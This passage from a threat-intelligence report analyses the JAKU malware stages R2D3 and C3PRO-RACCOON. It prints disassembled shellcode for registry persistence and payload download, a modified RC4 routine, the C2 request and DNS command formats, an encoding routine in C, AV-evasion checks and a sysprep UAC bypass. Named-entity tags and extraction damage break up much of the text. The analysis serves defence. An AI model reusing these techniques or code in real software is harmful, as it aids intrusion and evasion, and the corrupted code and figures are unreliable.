; if ( modkey & & modkeylen > = [CARDINAL] 1 ) { // [CARDINAL] Zero out the state and keydata memset(state , 0 , sizeof(state ) ) ; [ORG] memset(keydata , [DATE] 0 , sizeof(keydata ) ) ; // Initialize the state array with identity permutation ( neutral ) for ( i = [CARDINAL] 0 ; i < [CARDINAL] 256 ; i++ ) { state[i ] = i ; // This is an addition included in the malware // it is an attempt to randomize the permutations in the state array with a modulation key array // But there is a mistake where it 's only ever writing to state[2 ] instead of the // presumably intended state[i ] . However , this still results in the permutations being modified // enough to change the rc4 cipher for ( i = [CARDINAL] 0 ; i < [CARDINAL] 256 ; i++ ) { x = x % modkeylen ; state[2 ] = modkey[x++ ] ; // The permutations in the state array are now morphed / randomized for ( i = [CARDINAL] 0 ; i < [CARDINAL] 256 ; i++ ) { // Morph the permutations using the key data ( which is set to all [CARDINAL] zeros in this instance ) g = ( keydata[i ] + state[i ] + g ) ; // swap some bytes tmp = state[i ] ; state[i ] = state[g ] ; state[g ] = tmp ; // process the input dataTLP - WHITE | 23for ( i = [CARDINAL] 0 , g = [CARDINAL] 0 , j = [CARDINAL] 0 ; i < bufsize ; i++ ) g = ( g + 1 ) ; j = ( state[g ] + j ) ; // swap some bytes tmp = state[g ] ; state[g ] = state[j ] ; state[j ] = tmp ; // obtain xor index in state array xorIndex = ( state[j ] + state[g ] ) & [CARDINAL] 255 ; // perform the xor on the current index of the buffer buf[i ] ^= state[xorIndex ] ; } Bad Crypto . The only significant difference to a standard rc4 routine here is the addition of the \u201c for loop \u201d that is ( presumably ) meant to randomize the permutations in state[2 ] with the values from the modulation key . However , it seems that the author made a mistake : instead of each permutation , only the [ORDINAL] 3rd value in the array is ever modified . Modifying this one byte is still enough to result in a significantly different cipher . Fortunately , with this knowledge , it is trivial to crack the RC4 cipher without knowing the key . This is because it is possible to brute force the [ORDINAL] 3rd element of the state array , in the knowledge that it can only have [CARDINAL] 256 possible values . [ORG] Compression [ORG] Algorithm . The malware uses the LZ Huffman compression algorithm ( lzhuf ) . Using an open source library such as [PERSON] Mike Smiley 's LZH implementation allowed us to successfully extract the [ORDINAL] 2nd stage malware from the fake PNGs being decrypted . TLP - WHITE | [CARDINAL] 24MALWARE STAGE [CARDINAL] 2 \u2013 R2D3 R2D3 is a [ORDINAL] second stage ( fake [ORG] PNG ) malware that employs stealth tactics and AV avoidance . Its primary purpose appears to be to await an encrypted [ORDINAL] third stage component to execute . Stealth Injection . This [ORDINAL] second stage malware injects shellcode into a new explorer.exe process every time it wishes to do something significant , such as network traffic , registry , and file execution operations . This is a stealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into the entry point and then terminating the explorer.exe process in the shellcode immediately afterwards . AV Engine Detection . The malware checks whether [ORG] Bitdefender is installed by checking for the mutex \" BDAgent - oneinstance - mutex \" via the CreateMutexA API . It then checks if [ORG] AVG is installed by looking for an event named \" AVG{53036606 - 6F17 - 41a9 - 80DD - AB930D6BA4DD } \" via the CreateEventA API . If either of these exists , the malware will terminate execution . Service Installation . So long as [ORG] AVG and [ORG] Bitdefender are not detected , the malware will copy itself to % COMMONPROGRAMFILES%\\CompSvc.exe . It also creates the file % COMMONPROGRAMFILES%\\SvcStart.exe , which is embedded within the malware . It then injects shellcode into a new explorer.exe in order to execute SvcStart.exe with the following command line : [CARDINAL] SvcStart.exe [CARDINAL] R2D2 [CARDINAL] C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.extWhere \" C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.ext \" is the location of the original malware file . Analysis indicates that there are [CARDINAL] two command line prefixes : R2D2 : Terminates the currently running malware , deletes it from hard - disk and then executes the newly copied version in the common program files directory . R2D3 : Does not require a directory to be given in the command line string and results in SvcStart.exe dropping a batch file named exp.bat in the % TEMP% directory , which simply cleans up all of the malware as below::REPEAT DEL % [CARDINAL] 1 IF EXIST % [CARDINAL] 1 GOTO REPEAT DEL % 2TLP - WHITE | [CARDINAL] 25The R2D2 command line is the only one seen used during live analysis , whereas R2D3 appears to be a clean- up function . When the R2D2 command line is used , SvcStart.exe executes the newly created [PRODUCT] CompSvc.exe , which will check if it is running from the common program files directory . If this is the case , it will inject shellcode into a new explorer.exe in order to install a persistence key via [ORG] the [ORG] Microsoft [ORG] Active [ORG] Setup registry key location with a custom GUID:.data:0044B114 pRegistryShellCode : ; DATA XREF : sub_41BA5C+5Bo.data:0044B114 push ebp.data:0044B115 mov ebp , esp.data:0044B117 sub esp , 314h.data:0044B11D push ebx.data:0044B11E xor ebx , ebx.data:0044B120 cmp [ ebp-8 ] , ebx.data:0044B123 push esi.data:0044B124 mov esi , [CARDINAL] 12345678h.data:0044B129 jz short loc_44B130.data:0044B12B mov esi , [CARDINAL] 87654321h.data:0044B130.data:0044B130 loc_44B130 : ; CODE [PERSON] XREF : .data:0044B129j.data:0044B130 push edi.data:0044B131 push [CARDINAL] 40h.data:0044B133 pop ecx.data:0044B134 xor eax , eax.data:0044B136 lea edi , [ ebp-10Bh].data:0044B13C mov [ [NORP] ebp-10Ch ] , bl.data:0044B142 rep stosd.data:0044B144 stosw.data:0044B146 stosb.data:0044B147 push [CARDINAL] 40h.data:0044B149 xor eax , eax.data:0044B14B pop ecx.data:0044B14C lea edi , [ ebp-20Fh].data:0044B152 mov [ ebp-210h ] , bl.data:0044B158 push [CARDINAL] 40h.data:0044B15A rep stosd.data:0044B15C stosw.data:0044B15E stosb.data:0044B15F pop ecx.data:0044B160 xor eax , eax.data:0044B162 lea edi , [ ebp-313h].data:0044B168 mov [ ebp-314h ] , bl.data:0044B16E rep stosd.data:0044B170 stosw.data:0044B172 push 8003h.data:0044B177 mov [ ebp-4 ] , ebx.data:0044B17A stosb.data:0044B17B call dword ptr [ esi+2Ch ] ; kernel32.SetErrorMode.data:0044B17E lea eax , [ esi+344h].data:0044B184 push eax.data:0044B185 call dword ptr [ esi+20h ] ; GetModuleHandleA(\"ntdll.dll\").data:0044B188 mov edi , eax.data:0044B18A lea eax , [ esi+354h].data:0044B190 push eax.data:0044B191 push edi.data:0044B192 call dword ptr [ esi+24h ] ; [GPE] GetProcAddress(\"strlen\").data:0044B195 mov [ ebp-8 ] , eax.data:0044B198 lea eax , [ esi+374h].data:0044B19E push eax.data:0044B19F push edi.data:0044B1A0 call dword ptr [ esi+24h ] ; GetProcAddress(\"strcpy\").data:0044B1A3 mov edi , eax.data:0044B1A5 lea eax , [ esi+34h].data:0044B1A8 push eax.data:0044B1A9 lea eax , [ ebp-10Ch].data:0044B1AF push eax.data:0044B1B0 call edi ; ntdll.strcpy.data:0044B1B2 lea eax , [ esi+138h].data:0044B1B8 push eax.data:0044B1B9 lea eax , [ ebp-210h].data:0044B1BF push eax.data:0044B1C0 call edi ; [ORG] ntdll.strcpy.data:0044B1C2 lea eax , [ [GPE] esi+23Ch].data:0044B1C8 push eax.data:0044B1C9 lea eax , [ ebp-314h].data:0044B1CF push eax.data:0044B1D0 call edi ; ntdll.strcpy.data:0044B1D2 add esp , [CARDINAL] 18h.data:0044B1D5 cmp dword ptr [ esi+340h ] , [DATE] 1.data:0044B1DC lea eax , [ ebp-4].data:0044B1DF pop edi.data:0044B1E0 push eaxTLP [ORG] - WHITE | [CARDINAL] 26.data:0044B1E1 lea eax , [ ebp-10Ch].data:0044B1E7 push eax.data:0044B1E8 push dword ptr [ esi+30h].data:0044B1EB jnz short loc_44B235 ; RegOpenKeyA.data:0044B1ED call dword ptr [ esi+4 ] ; RegOpenKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1 - 7D22 - 4f20 - ADA2 - 3901BD61DDE4}\").data:0044B1F0 test eax , eax.data:0044B1F2 jz short loc_44B20C.data:0044B1F4 lea eax , [ ebp-4].data:0044B1F7 push eax.data:0044B1F8 lea eax , [ ebp-10Ch].data:0044B1FE push eax.data:0044B1FF push dword ptr [ esi+30h].data:0044B202 call dword ptr [ esi ] ; RegCreateKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1 - 7D22 - 4f20 - ADA2 - 3901BD61DDE4}\").data:0044B204 test eax , eax.data:0044B206 jnz loc_44B291.data:0044B20C.data:0044B20C loc_44B20C : ; CODE XREF : .data:0044B1F2j.data:0044B20C lea eax , [ ebp-314h].data:0044B212 push eax.data:0044B213 call dword ptr [ ebp-8 ] ; ntdll.strlen.data:0044B216 pop ecx.data:0044B217 push eax.data:0044B218 lea eax , [ ebp-314h].data:0044B21E push eax.data:0044B21F push [CARDINAL] 1.data:0044B221 lea eax , [ ebp-210h].data:0044B227 push ebx.data:0044B228 push eax.data:0044B229 push dword ptr [ ebp-4].data:0044B22C call dword ptr [ esi+8 ] ; [PRODUCT] RegSetValueExA(\"C:\\\\Program [PRODUCT] Files\\\\Common [PRODUCT] Files\\\\Services\\\\SvcStart.exe\").data:0044B22F test eax , eax.data:0044B231 jnz short loc_44B28B.data:0044B233 jmp short loc_44B283.data:0044B235 ; ---------------------------------------------------------------------------.data:0044B235.data:0044B235 loc_44B235 : ; CODE XREF : .data:0044B1EBj.data:0044B235 call dword ptr [ esi+4 ] ; RegOpenKeyA.data:0044B238 test eax , eax.data:0044B23A jnz short [ORG] loc_44B291.data:0044B23C lea eax , [ ebp-210h].data:0044B242 push eax.data:0044B243 call dword ptr [ ebp-8 ] ; [ORG] ntdll.strlen.data:0044B246 test eax , eax.data:0044B248 pop ecx.data:0044B249 jnz short loc_44B26C.data:0044B24B push dword ptr [ ebp-4].data:0044B24E call dword ptr [ esi+14h ] ; RegCloseKey.data:0044B251 lea eax , [ ebp-10Ch].data:0044B257 push eax.data:0044B258 push dword ptr [ esi+30h].data:0044B25B call dword ptr [ esi+0Ch ] ; [GPE] RegDeleteKeyA.data:0044B25E test eax , eax.data:0044B260 jnz short loc_44B291.data:0044B262 push [CARDINAL] 0C8h.data:0044B267 call dword ptr [ esi+28h ] ; ExitProcess.data:0044B26A jmp short loc_44B291.data:0044B26C ; ---------------------------------------------------------------------------.data:0044B26C.data:0044B26C loc_44B26C : ; CODE XREF : .data:0044B249j.data:0044B26C lea eax , [ ebp-210h].data:0044B272 push eax.data:0044B273 push dword ptr [ ebp-4].data:0044B276 call dword ptr [ esi+10h ] ; [LOC] RegDeleteValueA.data:0044B279 test eax , eax.data:0044B27B jnz short loc_44B28B.data:0044B27D push dword ptr [ ebp-4].data:0044B280 call dword ptr [ esi+14h ] ; RegCloseKey.data:0044B283.data:0044B283 [GPE] loc_44B283 : ; CODE [PERSON] XREF : .data:0044B233j.data:0044B283 push [CARDINAL] 0C8h.data:0044B288 call dword ptr [ esi+28h ] ; ExitProcess.data:0044B28B.data:0044B28B loc_44B28B : ; CODE XREF : .data:0044B231j.data:0044B28B ; .data:0044B27Bj.data:0044B28B push dword ptr [ ebp-4].data:0044B28E call dword ptr [ esi+14h ] ; [NORP] RegCloseKey.data:0044B291.data:0044B291 loc_44B291 : ; CODE [PERSON] XREF : .data:0044B206j.data:0044B291 ; .data:0044B23Aj data:0044B291 push [CARDINAL] 64h.data:0044B293 call dword ptr [ esi+28h ] ; ExitProcess.data:0044B296 pop esi.data:0044B297 xor eax , eaxTLP [PERSON] - WHITE | [CARDINAL] 27.data:0044B299 pop ebx.data:0044B29A leave.data:0044B29B retnWinpcap . After the shellcode is injected , the malware will load the winpcap npf.sys driver if it exists . It then begins to monitor all network adapters in order to determine which interface is the primary adapter that can access the internet . Then , it makes a [ORG] POST request to the [CARDINAL] C2 server with gzip compressed system Content [PERSON] - Type : multipart / form -data ; boundary=--HC - MPFD - BOUNDARY Content - Length : [CARDINAL] 320 User - Agent : Mozilla/5.0 ( Windows NT 5.1 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [ORG] Gecko ) Chrome/36.0.1985.125 [ORG] Safari/537.36 Proxy [ORG] - Connection : Keep [ORG] - Alive [ORG] Pragma : no - cache ----HC [DATE] - MPFD [DATE] - BOUNDARY Content - Disposition : form - data ; [ORG] name=\"id \" ----HC [TIME] - MPFD - BOUNDARY Content - Disposition : form - data ; name=\"userfile \" ; filename=\"AAwp2ySc.ifo \" Content - Type : application / octet -stream s \ufffd s \ufffd u \ufffd R \ufffd \ufffd t \ufffd \ufffd w \ufffd \ufffd \ufffd s \ufffd R054644 \ufffd \ufffd \ufffd \ufffd R \ufffd 5246 \ufffd \ufffd 4415 \ufffd \ufffd r \ufffd \ufffd \ufffd \ufffd \ufffd K \ufffd \ufffd \ufffd \ufffd \ufffd \ufffd ? \ufffd \ufffd \ufffd ----HC - MPFD - BOUNDARY -- The \" i d \" value \" [ORG] AAwp2ySc \" is a base64 encoded version of the [ORG] MAC address 's hexadecimal values for the adapter that is determined to be the primary one , which in this instance was \u201c [CARDINAL] 00 0c [CARDINAL] 29 db [CARDINAL] 24 [CARDINAL] 9c \u201d . The gzip compressed data , in plaintext looks like this example : CNAME : MICROSOFT DNAME : NoneNext , the malware injects shellcode into explorer.exe to contact its C2 with a GET request , which seems to expect another encrypted malware to be returned . The following shows parts of the shellcode ( dumped from [ORG] Ollydbg ) , which shows this [CARDINAL] C2 server communication . The comments indicate what the values of certain registers and addresses are in real time . Again , the [ORG] MAC address identifier can be seen in the following [CARDINAL] 0101A667 8D86 [CARDINAL] 70050000 [ORG] LEA [ORG] EAX , [ORG] DWORD [ORG] PTR DS:[ESI+0x570 ] ; [ORG] URLDownloadToFileA 0101A66D [CARDINAL] 50 [ORG] PUSH [ORG] EAX 0101A66E [DATE] 53 PUSH [ORG] EBX ; HMODULE = urlmon.dll 0101A66F FF56 08 CALL DWORD [ORG] PTR DS:[ESI+0x8 ] ; kernel32.GetProcAddress [CARDINAL] 0101A672 [CARDINAL] 8BD8 [ORG] MOV [ORG] EBX , [ORG] EAX [CARDINAL] 0101A674 85DB TEST [ORG] EBX , [ORG] EBX 0101A676 [CARDINAL] 75 [CARDINAL] 05 JNZ SHORT explorer.0101A67D [CARDINAL] 0101A678 6A 64 PUSH 0x64 0101A67A FF56 [CARDINAL] 0C CALL DWORD PTR DS:[ESI+0xC ] ; kernel32.ExitProcess [CARDINAL] 0101A67D [CARDINAL] 8D86 [CARDINAL] 6C040000 [ORG] LEA [ORG] EAX , DWORD [ORG] PTR DS:[ESI+0x46C ] ; C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\tmp2F.tmp 0101A683 6A 00 PUSH 0x0 [CARDINAL] 0101A685 6A 00 PUSH 0x0 [CARDINAL] 0101A687 [CARDINAL] 50 [ORG] PUSH [ORG] EAX [CARDINAL] 0101A689 [CARDINAL] 6A [CARDINAL] 00 PUSH 0x0 [CARDINAL] 0101A68B FFD3 CALL [ORG] EBX ; URLDownloadToFileATLP - WHITE | 28The code continues on to delete a Zone . Identifier ADS for msvcrt.dll ( msvcrt.dll : Zone . Identifier ) . The purpose of this part of the code is unclear , because msvcrt.dll does not seem to be overwritten by the malware and should not contain a Zone . Identifier record that prevents its usage in any way . Malware Configuration . The malware also contains a configuration of sorts . Some of the parts include : S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4 B : inner_Escl=1 S[260]Exe Location = C:\\Program Files\\Common Files\\Services\\CompSvc.exeEach field is preceded by the length and type of the value associated with it . For example : S[32 ] means that the value contains a string of [CARDINAL] 32 characters.\uf0b7 The inner_UniqID value seems to be a static value , probably used as a campaign identifier.\uf0b7 The inner_Escl value is a [NORP] Boolean , indicating whether escalated permissions are available . If not , thenthe malware drops a [ORG] DLL payload into the [PRODUCT] Windows sysprep folder under the name cryptbase.dll . It then launches sysprep.exe , which will run with administrative permissions and load up cryptbase.dll from the current folder rather than the system folder . This technique is a commonly used means of bypassing [PERSON] Windows [PERSON] User Account Control ( UAC).\uf0b7 The Exe Location value is the current location of the malware . TLP - WHITE | [CARDINAL] 29MALWARE STAGE 2 \u2013 C3PRO - RACCOONC3PRO - RACCOON is another one of the [ORDINAL] second stage components ( fake [ORG] PNG ) that is hosted on a C2 server with the small amount of targeted victims . This [CARDINAL] C2 data set is suspected of being a targeted set of victims and is referred to within the [NORP] JAKU analysis as RACCOON.The C3PRO- RACCOON malware initially communicates with a specific C2 server over [ORG] DNS . [PERSON] Kaspersky have already blogged about this same malware family when it was hosted on the KCNA [NORP] North [NORP] Korean news site in C3PRO - RACCOON Behaviour . This malware sample is another self - extractor , which drops the usual start.bat and end.bat files along with the [GPE] Trojan component and a utility to add a new [PRODUCT] Windows task : start.bat end.bat [ORG] drmanidd32.dll ( C3PRO - RACCOON trojan ) SetTaskPathDl.exe ( C # utility to add a new [PRODUCT] Windows task ) Microsoft.Win32.TaskScheduler.dll ( legitimate file used by SetTaskPathDl.exe for task scheduler stuff)The file start.bat is executed which results in SetTaskPathDl.exe being invoked with the following arguments:%temp%\\SetTaskPathDl.exe drmanidd32.dll Adobe Update SecuUpdates.dllThis results in [ORG] drmanidd32.dll being moved to [PERSON] % appdata%\\Adobe\\Update\\SecuUpdates.dll and a [PRODUCT] Windows task created to execute the following command upon user logon : [PERCENT] C:\\WINDOWS\\system32\\rundll32.exe [PERCENT] % appdata%\\Adobe\\Update\\SecuUpdates.dll , start nowOnce executed , SecuUpdates.dll generates [ORG] DNS traffic , which is the [CARDINAL] C2 channel communication : The malware resolves a specific C2 [ORG] DNS name and uses the returned [ORG] IP as a [ORG] DNS server for resolving the CNAME of pWrpqMoqqipJiiwGBgaoxueIyMaG56g.e.q , which results in a resolution of LS4.com at [ORG] IP \" + MICROSOFT_000C29DB249C \" which is a ' + ' followed by the current computer name , \" _ \" and then the [ORG] MAC address of the primary network adapter . TLP - WHITE | [CARDINAL] 30Here is the encryption routine in assembly : loop : mov al , buffer[ecx ] ; buffer contains string to encrypt ( i.e. \" + MICROSOFT_000C29DB249C\")add al , [CARDINAL] 3 ; Add a value of [CARDINAL] 3 to the current [QUANTITY] 8 [QUANTITY] - bit char valuemovzx eax , al ; Clear eax , replace with lower [QUANTITY] 8 [QUANTITY] - bit val ( this is pointless , poor coding)xor eax , [CARDINAL] 3 ; XOR 32 - bit value of eax ( which is just 8 - bit al , effectively ) by [CARDINAL] 3mov edx , eax ; Save eax in edxshr edx , [CARDINAL] 3 ; Shift edx right by [CARDINAL] 3 bitsshl al , [CARDINAL] 5 ; Shift [QUANTITY] 8 [QUANTITY] - bit eax value left by [CARDINAL] 5 bitsor dl , al ; OR [QUANTITY] 8 [QUANTITY] - bit edx against [QUANTITY] 8 [QUANTITY] - bit eaxmov buffer[ecx ] , dl ; Copy new value ( stored in dl ) into current index of bufferinc ecx ; Increase buffer indexcmp ecx , edi ; Check if we 're done yetjl short loopThis routine is poorly coded , as [QUANTITY] 32 [QUANTITY] - bit values are not required . Alternatively , the author introduced an error in the left shift . Regardless , once corrected and optimised , the routine look like this : loop : mov al , buffer[ecx ] ; buffer contains string to encrypt ( i.e. \" + MICROSOFT_000C29DB249C\")add al , [CARDINAL] 3 ; Add a value of [CARDINAL] 3 to the current char valuexor [PERSON] al , [CARDINAL] 3 ; XOR char value by [CARDINAL] 3mov dl , al ; [PERSON] Copy char value ( into dl)shr dl , [CARDINAL] 3 ; Shift char value right by [CARDINAL] 3 bits ( truncate)shl al , [CARDINAL] 5 ; Shift the same char value ( in al ) left by [CARDINAL] 5 bits ( truncate)or dl , al ; OR both char valuesmov buffer[ecx ] , dl ; Copy new value ( stored in dl ) into current index of bufferinc ecx ; Increase buffer indexcmp ecx , edi ; Check if we 're done yetjl short loopOr the same , more complete routine in C : void encode(char * buffer){for ( int i = [CARDINAL] 0 ; i < strlen(buffer ) ; i++){unsigned char a = buffer[i];unsigned char b;a + = 3;a ^= 3;b = a;b > > = 3;a < < = [CARDINAL] 5;b |= a;buffer[i ] = b;}}TLP - WHITE | 31DNS Command Channel . The [ORG] DNS requests containing the encrypted system name and [ORG] MAC address happen regularly ( ~2 minutes ) , with the IP of LS4.com changing each time . The malware translates LS4.com into LS4= , base64 decodes it and then decrypts it using the reverse of the algorithm above . The result of this is the string \" go \" , and the malware also understands the following commands : COMMAND PURPOSENOTESgo dldudecmcuexThis just means \" OK - no action to take \" Change wait / sleep time between [ORG] DNS C2 attempts Takes 1 parameter ( sleep time inTakes 0 parametersNot implemented by authorStart UDT based C2 module Start secondary C2 module Inject a [ORG] DLL into a process via remote thread in explorer.exe Unload DLL from current process via remote thread in explorer.exe Securely delete file ( write / read [CARDINAL] 4 times , rename 900 times , truncate to [CARDINAL] 0 size , then delete ) Execute command - line utility ( % COMSPEC% ) with parameter and send results to [CARDINAL] C2 over [ORG] DNS Send computer information to [CARDINAL] C2 over DNSExecute command via [ORG] WinExec but do not send back the results to [CARDINAL] C2 serverminutes ) This routine does nothing and appears to be a placeholder for a future routine Takes [CARDINAL] 2 parameters ( port , server ) Takes [CARDINAL] 2 parameters ( port , server ) Takes [CARDINAL] 2 parameters ( [ORG] DLL filename , process name without .exe ) Takes [CARDINAL] 2 parameters ( [ORDINAL] first param must be 0 , [ORDINAL] second is [ORG] DLL filename ) Takes [CARDINAL] 1 parameter ( file to delete)Takes [CARDINAL] 1 parameter ( command to execute ) Takes [CARDINAL] 2 parameters ( port - ignored , server ) Takes [CARDINAL] 1 parameter ( command to execute)A \" parameter \" here is a part of the CNAME separated by a \" . \" . For example , \" LS4.test.com \" would be the command , \" go \" with [CARDINAL] 1 parameter \" test \" The \" secondary \" C2 module receives commands over [ORG] TCP and a custom protocol . The data structures are defined below:// This is the client hello packet structure ( actually not really a structure , just a 4 byte value)typedef struct clienthello_s{uint32 client_magic ; // Must be [CARDINAL] 0xDF1B697A } clienthello_t;// This is the encryption key structure for packet encryption & decryptiontypedef struct keyheader_s{byte subkey;byte [PERSON] xorkey;byte [PERSON] rolkey;byte _ align ; // Unused , just here for alignment } keyheader_t;// This is the full structure for anything received from the servertypedef struct [CARDINAL] servercmd_s{uint32 server_magic ; // Must be [NORP] 0xA37CE092keyheader_t hdr ; // Encryption keysTLP - WHITE | 32long cmdlen ; // Length of command buffer ( encrypted)char cmdbuf[512 ] ; // Command buffer ( encrypted ) } servercmd_t;// This is used by the file upload & download routinestypedef struct filetransfer_s{long filesize ; // [PERSON] Size of file ( encrypted)byte filedata [ ] ; // File contents ( encrypted ) } filetransfer_t;The \" UDT \" C2 module receives commands over [ORG] UDP and the UDT library protocol . The data structures used by the malware are similar to the ones above , but without magic values or encryption keys . Instead , the encryption keys are static . The UDT C2 module only supports a subset of the commands that the secondary C2 module does . The command set supported by the secondary and UDT C2 modules is the same as in [ORG] Kaspersky [ORG] \u2019s analysis of the [ORG] KCNA malware . However , our analysis of the [ORG] KCNA malware and C3PRO - RACCOON revealed some additional functionality and small differences in what [PERSON] Kaspersky reported . The full list of commands used by the secondary and [ORG] UDT modules can be seen in the table below : COMMAND PURPOSE_get_got_cmd_exe_quit_inf_dll_put_del_dir_prc_cap_dluEncrypt and send specified fileEncrypt and send specified file and then securely delete it from diskExecute command - line utility ( % COMSPEC% ) with parameter and send results to C2Execute parameter via WinExec APIExit the C2 threadGrab system information , save it to file , encrypt it , send it to C2 and then securely delete it . [CARDINAL] \uf0b7 Operating system version [CARDINAL] \uf0b7 All connected drives and properties \uf0b7 Network adapter properties \uf0b7 Disk free space [CARDINAL] \uf0b7 All installed programsInject a [ORG] DLL into a process via remote thread in [DATE] explorer.exeReceive , decrypt , and write a buffer to disk at a specified file locationSecurely delete specified file using [PERSON] John [PERSON] Underhill 's \" [WORK_OF_ART] Secure [WORK_OF_ART] File [WORK_OF_ART] Shredder \" codeSend a directory listing for path specifiedSend a full running process list to C2Take a screenshot , save it to file , encrypt it , send it to C2 and then securely delete itUnload DLL from current process only via remote thread in explorer.exeTLP - WHITE | [CARDINAL] 33OBSERVATIONS [ORG] ON [ORG] C3PRO - RACCOONThe ability for malware to concurrently support [CARDINAL] three separate , custom built [CARDINAL] C2 channels is more advanced than the majority of malware currently observed in the global threat landscape . This offers insight into the amount of effort the malware author and actor(s ) have expended to ensure that the malware is stealthy and can remain in contact with its [ORG] C2s , despite the network environment it may be running within . UDT [PERSON] Library . The malware uses an open source library called UDT3 for one of its [CARDINAL] C2 channels . UDT provides much of the benefits of [ORG] TCP but retains higher data transfer speeds over [ORG] UDP . The authors likely chose the library in order to provide the flexibility of being able to securely use [ORG] UDP for C2 communication , as well as being stealthy at the same time . [PERSON] Secure [PERSON] Delete . The file deletion routine has been taken from publicly available secure erasure code . This code was originally written by [PERSON] John [PERSON] Underhill and called \u201c [WORK_OF_ART] Secure [WORK_OF_ART] File [WORK_OF_ART] Shredder\u201d4 . The routine used in the malware even contains the same mistake as [PERSON] John [PERSON] Underhill made , where he renames the file [CARDINAL] 780 times ( [CARDINAL] 30 * [CARDINAL] 26 ) instead of the intended [CARDINAL] 30 . The only difference is that the file truncation is only performed once in the malware , rather than [CARDINAL] 10 times , as in [ORG] Underhill 's code . The purpose of this code is to prevent advanced forensics techniques from being able to recover the deleted files . [PERSON] Unfinished [PERSON] Code . The ' du ' and ' dlu ' commands are interesting because they only support unloading a module from the current process , but by creating a remote thread in a new explorer.exe . This makes little sense because it would be a lot simpler and more effective to just unload the module in the current process . This is likely to be an unfinished or abandoned routine that is currently not used by the actor . The older version of this malware that [PERSON] Kaspersky analysed did not have any implementation for ' dlu ' , and the ' dll ' routine did not create a new thread in an explorer.exe process to do this work , but instead did it from its own process . [PERSON] Spoofed [PERSON] File [PERSON] Dates . When a file is sent to the infected machine via the \" _ put \" command and written to disk , the file access times are modified to be the same as gdi32.dll 's from the system directory . This makes the file less suspicious and can also prevent some forensic time - lining . Under Development . The older version of this malware that [PERSON] Kaspersky analysed was compiled using [ORG] Microsoft [ORG] Visual [ORG] Studio [CARDINAL] 6.0 , whereas this version has been compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio [CARDINAL] 10.0 . The malware is clearly being actively developed and the developers ' environment(s ) are being improved.3 url [CARDINAL] 4 url | [CARDINAL] 34WHO IS SAPHARUS?SAPHARUS - PC is the name of a [PRODUCT] Windows computer which appears [CARDINAL] over [CARDINAL] 1,800 times in [CARDINAL] one of the JAKU Datasets ( referred to as the [ORG] SAPHARUS data set for this reason ) . From a research point of view , this significant anomaly clearly needed investigation . [ORG] SAPHARUS [ORG] Timeline . The number of entries is the database is constantly changing . While the total number of entries appears to grow , due to more victims being infected , the number of [ORG] SAPHARUS entries is decreasing : DATEVICTIM COUNTSAPHARUS - PC COUNT2015 - 10 - 04 2015 - 10 - 26 2015 - 11 - 15 2015 - 12 - 105765 1831The Real SAPHARUS . Within the dataset there appear one is ' real ' [ORG] SAPHARUS - PC ( UID : D1336E59 [PERSON] - 0FB3- because of the system information is complete and is not duplicated elsewhere . Whereas , the [ORG] SAPHARUS - PC duplicates all have identical system information . [ORG] Hypothesis # 1 - Overwrites . Real entries were overwritten in error with the [ORG] SAPHARUS data . A number of facts support this hypotheses : the fake [ORG] SAPAHRUS data is clearly corrupted and is missing the task list and recent files , part of which could have resulted in some sort of parsing error or when dumping it in the DB . The [ORG] ASN 's and [ORG] IP 's of these entries seem to indicate that they are real victims . However , it is impossible to prove that it was n't done intentionally . ( Likelihood : High)Hypothesis # [ORG] 2 [ORG] - [ORG] Additions . [ORG] SAPHARUS entries were added either due to an error or intentionally . This seems less likely as [ORG] SAPHARUS - PC entries reuse some of the [ORG] IPs already in the database . Furthermore , adding [ORG] SAPHARUS entries intentionally would serve very little purpose . There is evidence that [CARDINAL] at [CARDINAL] least [CARDINAL] one [ORG] SAPHARUS - PC is bogus : [ORG] SAPHARUS at [ORG] Forcepoint . [CARDINAL] One of the hosts with the name [ORG] SAPHARUS - PC has an external [ORG] IP address recorded in the dataset , which is in reality an [ORG] IP address owned and operated by Forcepoint . During the analysis of [PRODUCT] JAKU , [ORG] the [ORG] Forcepoint [ORG] Special [ORG] Investigation team operated a honeypot machine which had an external [ORG] IP address identical to the [ORG] SAPHARUS - PC public IP address . Diversity of Addresses . The [ORG] SAPHARUS - PC external [ORG] IP addresses are from a large and diverse number of ASNs . These [ORG] IP addresses and ASNs appear to correlate with the ASNs of other victims . [ORG] Truncated [ORG] System [ORG] Information . [ORG] SAPHARUS - PC entries have truncated system information ( [ORG] INFO ) ; i.e. no task list and no recent files . It is believed that the [ORG] SAPHARUS - PC entries are duplicated information from other victim data . Why this is the case is unclear . Possibilities include programming errors in the [CARDINAL] C2 software ( possible ) , or the use of [ORG] SAPHARUS - PC as a ' flag ' while administering the [CARDINAL] C2 data sets ( unlikely).For analysis purposes , the [ORG] SAPHARUS - PC entries were not included in detailed analysis such as correlation of victims within and across [CARDINAL] C2 servers . TLP - WHITE | 35C2 TELEMETRY DATABASESSQLite Databases . All JAKU C2 servers identified have viewable directories via the local web server . From a web browser , it is possible to view the content of a directory named /img : Index of /imgIcon Name Last modified [PERSON] Size [PERSON] Description____________________________________________________________________________________________________________________________[DIR ] Parent Directory[IMG ] near.jpg 09 - Dec-2015 19:59 451M____________________________________________________________________________________________________________________________Apache/2.2.21 ( Unix ) [ORG] DAV/2 [ORG] mod_ssl/2.2.21 OpenSSL/1.0.0c PHP/5.3.8 mod_apreq2 [CARDINAL] - 20090110/2.7.1 mod_perl/2.0.5Perl / v5.10.1 Server at pic3.mooo.com Port [DATE] 80Near.jpg . The file called [ORG] near.jpg is not an image file . When examined , the file is found to be a SQLite2 format [ORG] database:$ file near.jpgnear.jpg : SQLite 2.x databaseThis database contains details of the malware / botnet victim hosts . It details the network information , dates and times the malware first ' called home ' , the last call - home time , the last updated time and a history of the malware beaconing to the C2 server:$ sqlite [ORG] near.jpg .schemaCREATE TABLE child ( uid TEXT PRIMARY KEY , version REAL , pip TEXT , info [ORG] TEXT , infouptime [ORG] INTEGER , iplist [ORG] TEXT , instime [ORG] INTEGER , lasttime [ORG] INTEGER , downfile [ORG] TEXT , downver REAL);CREATE 